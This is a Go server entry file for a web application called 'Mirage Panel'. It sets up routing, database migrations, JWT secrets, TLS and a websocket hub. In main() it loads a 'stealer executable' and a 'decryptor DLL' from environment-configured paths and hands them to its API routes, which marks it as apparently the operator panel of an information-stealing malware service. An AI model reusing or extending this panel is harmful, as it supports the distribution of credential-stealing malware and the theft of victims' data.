package main

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"embed"
	"encoding/hex"
	"encoding/pem"
	"io/fs"
	"log/slog"
	"math/big"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/go-chi/chi/v5"
	chimw "github.com/go-chi/chi/v5/middleware"

	"zialfi-panel/internal/api"
	"zialfi-panel/internal/db"
	mw "zialfi-panel/internal/middleware"
	"zialfi-panel/internal/ws"
)

//go:embed frontend/dist
var frontendFS embed.FS

func getEnv(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func generateSecret() string {
	b := make([]byte, 32)
	if _, err := rand.Read(b); err != nil {
		slog.Error("failed to generate random secret", "err", err)
		os.Exit(1)
	}
	return hex.EncodeToString(b)
}

func generateSelfSignedCert(certDir string) (string, string, error) {
	certPath := filepath.Join(certDir, "cert.pem")
	keyPath := filepath.Join(certDir, "key.pem")

	if _, err := os.Stat(certPath); err == nil {
		return certPath, keyPath, nil
	}

	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return "", "", err
	}

	template := x509.Certificate{
		SerialNumber: big.NewInt(time.Now().UnixNano()),
		Subject: pkix.Name{
			Organization: []string{"Mirage Panel"},
			CommonName:   "localhost",
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		DNSNames:              []string{"localhost"},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &key.PublicKey, key)
	if err != nil {
		return "", "", err
	}

	if err := os.MkdirAll(certDir, 0700); err != nil {
		return "", "", err
	}

	certOut, err := os.Create(certPath)
	if err != nil {
		return "", "", err
	}
	defer certOut.Close()
	if err := pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: certDER}); err != nil {
		return "", "", err
	}

	keyOut, err := os.Create(keyPath)
	if err != nil {
		return "", "", err
	}
	defer keyOut.Close()
	if err := pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)}); err != nil {
		return "", "", err
	}

	slog.Info("generated self-signed certificate", "cert", certPath, "key", keyPath)
	return certPath, keyPath, nil
}

func main() {
	port := getEnv("PORT", "8080")
	dbPath := getEnv("DB_PATH", "data/mirage.db")
	databaseURL := getEnv("DATABASE_URL", "")
	dbProvider := getEnv("DB_PROVIDER", "sqlite")
	jwtSecret := getEnv("JWT_SECRET", "")
	allowedOrigins := getEnv("ALLOWED_ORIGINS", "http://localhost:5173")

	tlsEnabled, _ := strconv.ParseBool(os.Getenv("TLS_ENABLED"))
	tlsSelfSigned, _ := strconv.ParseBool(os.Getenv("TLS_SELF_SIGNED"))

	if jwtSecret == "" {
		secretFile := filepath.Join(filepath.Dir(dbPath), ".jwt_secret")
		if data, err := os.ReadFile(secretFile); err == nil {
			jwtSecret = strings.TrimSpace(string(data))
		} else {
			jwtSecret = generateSecret()
			if err := os.WriteFile(secretFile, []byte(jwtSecret), 0600); err != nil {
				slog.Warn("failed to persist JWT secret, tokens will be invalid after restart", "err", err)
			}
		}
	}

	slog.Info("starting Mirage Panel",
		"port", port,
		"db", dbPath,
		"provider", dbProvider,
		"tls", tlsEnabled,
		"allowed_origins", allowedOrigins,
	)

	providerType := db.ProviderSQLite
	switch strings.ToLower(dbProvider) {
	case "postgres", "postgresql":
		providerType = db.ProviderPostgres
	}

	connString := dbPath
	if providerType == db.ProviderPostgres {
		if databaseURL != "" {
			connString = databaseURL
		}
	} else {
		if err := os.MkdirAll(filepath.Dir(connString), 0755); err != nil {
			slog.Error("failed to create data directory", "err", err)
			os.Exit(1)
		}
	}

	p := db.NewProvider(providerType, connString)
	sqlDB, err := p.Open()
	if err != nil {
		slog.Error("failed to open database", "err", err)
		os.Exit(1)
	}
	defer sqlDB.Close()

	if err := db.RunMigrationsWithProvider(sqlDB, db.MigrationsFS, providerType); err != nil {
		slog.Error("failed to run migrations", "err", err)
		os.Exit(1)
	}

	r := chi.NewRouter()

	r.Use(chimw.RequestID)
	r.Use(mw.RealIP)
	r.Use(mw.SecurityHeaders)
	r.Use(mw.RequestSizeLimit)
	r.Use(chimw.Logger)
	r.Use(chimw.Recoverer)
	r.Use(chimw.Timeout(30 * time.Second))

	r.Use(mw.CORS(allowedOrigins))
	r.Use(mw.CSRFProtect)
	r.Use(mw.RateLimit(100, time.Minute))
	r.Use(mw.BanCheck(sqlDB))

	r.Get("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"status":"ok"}`))
	})

	r.Get("/api/csrf", func(w http.ResponseWriter, r *http.Request) {
		mw.CSRFToken(w)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"ok":true}`))
	})

	wsHub := ws.NewHub()
	go wsHub.Run()

	r.Get("/ws", ws.ServeWs(wsHub, jwtSecret, allowedOrigins))

	stealerPath := getEnv("STEALER_EXE_PATH", "")
	var stealerExe []byte
	if stealerPath != "" {
		var err error
		stealerExe, err = os.ReadFile(stealerPath)
		if err != nil {
			slog.Error("failed to read stealer exe", "path", stealerPath, "err", err)
			os.Exit(1)
		}
		slog.Info("loaded stealer executable", "path", stealerPath, "size", len(stealerExe))
	}

	decryptorPath := getEnv("DECRYPTOR_DLL_PATH", "")
	var decryptorDll []byte
	if decryptorPath != "" {
		var err error
		decryptorDll, err = os.ReadFile(decryptorPath)
		if err != nil {
			slog.Error("failed to read decryptor DLL", "path", decryptorPath, "err", err)
			os.Exit(1)
		}
		slog.Info("loaded decryptor DLL", "path", decryptorPath, "size", len(decryptorDll))
	}

	api.SetupRoutes(r, sqlDB, jwtSecret, allowedOrigins, wsHub, stealerExe, decryptorDll)

	distFS, err := fs.Sub(frontendFS, "frontend/dist")
	if err != nil {
		slog.Error("failed to resolve frontend filesystem", "err", err)
		os.Exit(1)
	}

	r.Handle("/assets/*", http.FileServer(http.FS(distFS)))

	r.Get("/public/*", func(w http.ResponseWriter, r *http.Request) {
		index, err := fs.ReadFile(distFS, "index.html")
		if err != nil {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		w.Write(index)
	})

	r.NotFound(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasPrefix(r.URL.Path, "/api/") {
			http.NotFound(w, r)
			return
		}
		index, err := fs.ReadFile(distFS, "index.html")
		if err != nil {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		w.Write(index)
	})

	srv := &http.Server{
		Addr:    ":" + port,
		Handler: r,
	}

	go func() {
		addr := srv.Addr
		if tlsEnabled {
			scheme := "https"
			certDir := filepath.Join(filepath.Dir(connString), "certs")
			var certFile, keyFile string
			var tlsDesc string
			if tlsSelfSigned {
				certFile, keyFile, err = generateSelfSignedCert(certDir)
				if err != nil {
					slog.Error("failed to generate self-signed cert", "err", err)
					os.Exit(1)
				}
				tlsDesc = "self-signed"
			} else {
				certFile = filepath.Join(certDir, "cert.pem")
				keyFile = filepath.Join(certDir, "key.pem")
				if _, err := os.Stat(certFile); os.IsNotExist(err) {
					slog.Error("TLS enabled but cert.pem not found and TLS_SELF_SIGNED is false", "cert", certFile)
					os.Exit(1)
				}
				tlsDesc = "custom"
			}
			slog.Info("listening", "addr", addr, "scheme", scheme, "tls", tlsDesc)
			if err := srv.ListenAndServeTLS(certFile, keyFile); err != nil && err != http.ErrServerClosed {
				slog.Error("server error", "err", err)
				os.Exit(1)
			}
		} else {
			slog.Info("listening", "addr", addr, "scheme", "http")
			if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				slog.Error("server error", "err", err)
				os.Exit(1)
			}
		}
	}()

	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	<-quit

	slog.Info("shutting down...")

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	if err := srv.Shutdown(ctx); err != nil {
		slog.Error("forced shutdown", "err", err)
	}

	slog.Info("stopped")
}
